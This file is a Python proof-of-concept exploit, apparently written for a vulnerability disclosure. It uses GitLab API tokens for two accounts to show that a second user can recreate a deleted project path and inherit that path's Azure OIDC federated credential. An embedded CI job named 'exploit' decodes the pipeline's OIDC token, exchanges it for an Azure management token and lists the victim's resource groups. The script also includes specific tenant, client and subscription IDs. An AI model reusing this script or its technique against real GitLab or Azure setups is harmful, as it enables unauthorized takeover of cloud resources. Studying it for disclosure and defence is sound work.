"""
CROSS-USER proof: Account 1 creates project, Account 2 squats it.
Different humans, same Azure access.
"""
import os, sys, json, time, base64, urllib.request, urllib.parse, urllib.error, subprocess

PAT1 = os.environ.get("PAT1", "")
PAT2 = os.environ.get("PAT2", "")
AZURE_TENANT = "178a51bf-8b20-49ff-b655-56245d5c173c"
AZURE_CLIENT = "6db79b27-8cbf-4e59-869a-e90d8026a45c"
APP_OBJ_ID = "ce51b24f-7ed9-4076-830c-4cf125df4085"
GROUP_ID = 132381178
GROUP_NAME = "oidc-poc-grp"
TS = str(int(time.time()) % 100000)
PROJECT_NAME = f"cross-user-{TS}"
FULL_PATH = f"{GROUP_NAME}/{PROJECT_NAME}"
EVIDENCE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "e2e_crossuser_evidence.txt")

CI_TEMPLATE = """stages:
  - test
exploit:
  stage: test
  image: python:3.12-slim
  id_tokens:
    OIDC_TOKEN:
      aud: "https://gitlab.com"
  script:
    - python3 -c "import base64,json,os;t=os.environ['OIDC_TOKEN'];p=t.split('.')[1]+'=='*3;c=json.loads(base64.urlsafe_b64decode(p));print(json.dumps(c,indent=2));print();print('sub='+c['sub']);print('project_id='+str(c['project_id']));print('project_path='+c['project_path']);print('user_login='+c['user_login']);print('user_id='+str(c['user_id']))"
    - |
      python3 << 'PYEOF'
      import urllib.request, urllib.parse, os, json
      oidc = os.environ['OIDC_TOKEN']
      data = urllib.parse.urlencode(dict(grant_type='client_credentials',client_id='""" + AZURE_CLIENT + """',client_assertion_type='urn:ietf:params:oauth:client-assertion-type:jwt-bearer',client_assertion=oidc,scope='https://management.azure.com/.default')).encode()
      try:
        resp = json.loads(urllib.request.urlopen(urllib.request.Request('https://login.microsoftonline.com/""" + AZURE_TENANT + """/oauth2/v2.0/token', data=data)).read())
        if 'access_token' in resp:
          print(f'SUCCESS - Azure token: {len(resp["access_token"])} chars')
          rg = json.loads(urllib.request.urlopen(urllib.request.Request('https://management.azure.com/subscriptions/f8a85b5e-830d-4646-9f50-64c167ca17c4/resourcegroups?api-version=2024-03-01',headers=dict(Authorization=f'Bearer {resp["access_token"]}'))).read())
          print(json.dumps(rg,indent=2))
        else:
          print('FAILED'); print(json.dumps(resp,indent=2))
      except Exception as e:
        print(f'ERROR: {e}')
      PYEOF
"""

evidence = []
def log(msg):
    print(msg, flush=True)
    evidence.append(str(msg))

def gl(pat, method, path, data=None, ct=None):
    url = f"https://gitlab.com/api/v4{path}"
    headers = {"PRIVATE-TOKEN": pat}
    if ct: headers["Content-Type"] = ct
    if data and isinstance(data, dict): data = urllib.parse.urlencode(data).encode()
    elif data and isinstance(data, str): data = data.encode()
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try: return json.loads(urllib.request.urlopen(req, timeout=30).read())
    except urllib.error.HTTPError as e: return {"error": e.code, "body": e.read().decode()[:300]}

def wait_pipe(pat, enc, timeout=300):
    start = time.time()
    while time.time() - start < timeout:
        pipes = gl(pat, "GET", f"/projects/{enc}/pipelines?ref=main&per_page=1")
        if isinstance(pipes, list) and pipes:
            st = pipes[0].get("status")
            log(f"  pipeline={pipes[0]['id']} status={st}")
            if st in ("success", "failed"): return pipes[0]["id"], st
        time.sleep(10)
    return None, "timeout"

def get_log(pat, enc, pipe_id):
    time.sleep(8)
    jobs = gl(pat, "GET", f"/projects/{enc}/pipelines/{pipe_id}/jobs")
    if isinstance(jobs, list) and jobs:
        jid = jobs[0]["id"]
        req = urllib.request.Request(f"https://gitlab.com/api/v4/projects/{enc}/jobs/{jid}/trace", headers={"PRIVATE-TOKEN": pat})
        try: return urllib.request.urlopen(req, timeout=30).read().decode("utf-8", errors="replace")
        except: return "ERROR"
    return "ERROR"

def gcmd(cmd):
    r = subprocess.run(cmd, capture_output=True, text=True, shell=True)
    return r.stdout.strip()

log("=" * 60)
log("CROSS-USER PROOF: Two different GitLab users, same Azure access")
log("=" * 60)
log(f"Account 1: ACD421 (victim/original owner)")
log(f"Account 2: anastasia061694-creator (attacker/squatter)")
log(f"Group: {GROUP_NAME} (id={GROUP_ID})")
log(f"Project: {FULL_PATH}")
log("")

# Setup Azure federated credential
expected_sub = f"project_path:{FULL_PATH}:ref_type:branch:ref:main"
log(f"Azure federated credential subject: {expected_sub}")
creds = gcmd(f'az ad app federated-credential list --id {APP_OBJ_ID} --query "[].id" -o tsv').split("\n")
for c in creds:
    if c.strip(): gcmd(f"az ad app federated-credential delete --id {APP_OBJ_ID} --federated-credential-id {c.strip()}")
fed = json.dumps({"name": "cross-user", "issuer": "https://gitlab.com", "subject": expected_sub, "audiences": ["https://gitlab.com"], "description": "Cross-user proof"})
fed_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fed-cross.json")
with open(fed_file, "w") as f: f.write(fed)
gcmd(f"az ad app federated-credential create --id {APP_OBJ_ID} --parameters {fed_file}")
time.sleep(3)

enc = urllib.parse.quote(FULL_PATH, safe="")
ci_b64 = base64.b64encode(CI_TEMPLATE.encode()).decode()
payload = json.dumps({"branch": "main", "commit_message": "cross-user-poc", "encoding": "base64", "content": ci_b64})

# PHASE 1: Account 1 (ACD421) creates project
log("\n=== PHASE 1: ACCOUNT 1 (ACD421) CREATES PROJECT ===")
resp1 = gl(PAT1, "POST", "/projects", {"name": PROJECT_NAME, "path": PROJECT_NAME, "namespace_id": GROUP_ID, "visibility": "private", "initialize_with_readme": "true"})
pid1 = resp1.get("id")
log(f"Created by ACD421: pid={pid1} path={resp1.get('path_with_namespace')}")
time.sleep(5)
gl(PAT1, "POST", f"/projects/{enc}/repository/files/.gitlab-ci.yml", payload, "application/json")
log("CI pushed by Account 1")
log("Waiting for pipeline...")
pipe1, st1 = wait_pipe(PAT1, enc)
log(f"Pipeline: {st1}")
log1 = get_log(PAT1, enc, pipe1)
for line in log1.split("\n"):
    for kw in ["sub=", "project_id=", "user_login=", "user_id=", "SUCCESS", "FAILED", "Azure token", "oidc-poc-rg"]:
        if kw in line: log(line.strip()[:200]); break

# PHASE 2: Delete project, Account 2 squats
log("\n=== PHASE 2: DELETE + ACCOUNT 2 (anastasia061694-creator) SQUATS ===")
gl(PAT1, "DELETE", f"/projects/{pid1}")
time.sleep(3)
renamed = gl(PAT1, "GET", f"/projects/{pid1}").get("path_with_namespace", "")
gl(PAT1, "DELETE", f"/projects/{pid1}?permanently_remove=true", {"full_path": renamed})
time.sleep(10)
log(f"Path check: {gl(PAT1, 'GET', f'/projects/{enc}').get('error', 'exists')}")

# Account 2 creates at same path
resp2 = gl(PAT2, "POST", "/projects", {"name": PROJECT_NAME, "path": PROJECT_NAME, "namespace_id": GROUP_ID, "visibility": "private", "initialize_with_readme": "true"})
pid2 = resp2.get("id")
log(f"Created by anastasia061694-creator: pid={pid2} path={resp2.get('path_with_namespace')}")
log(f"DIFFERENT user, DIFFERENT project_id ({pid1} vs {pid2}), SAME path")

time.sleep(5)
gl(PAT2, "POST", f"/projects/{enc}/repository/files/.gitlab-ci.yml", payload, "application/json")
log("CI pushed by Account 2")
log("Waiting for pipeline...")
pipe2, st2 = wait_pipe(PAT2, enc)
log(f"Pipeline: {st2}")
log2 = get_log(PAT2, enc, pipe2)
for line in log2.split("\n"):
    for kw in ["sub=", "project_id=", "user_login=", "user_id=", "SUCCESS", "FAILED", "Azure token", "oidc-poc-rg"]:
        if kw in line: log(line.strip()[:200]); break

# PROOF
log("\n" + "=" * 60)
log("CROSS-USER PROOF")
log("=" * 60)
log(f"Account 1 (ACD421): pid={pid1}")
log(f"Account 2 (anastasia061694-creator): pid={pid2}")
log(f"Same path: {FULL_PATH}")
log(f"Different users: ACD421 vs anastasia061694-creator")
log(f"Different project_ids: {pid1} vs {pid2}")
if "SUCCESS" in (log2 or ""):
    log("AZURE TOKEN: Account 2 OBTAINED victim's Azure access")

# Cleanup
gl(PAT2, "DELETE", f"/projects/{pid2}")
log("Cleaned up")

with open(EVIDENCE_FILE, "w", encoding="utf-8") as f:
    f.write("\n".join(evidence))
log(f"\nEvidence: {EVIDENCE_FILE}")
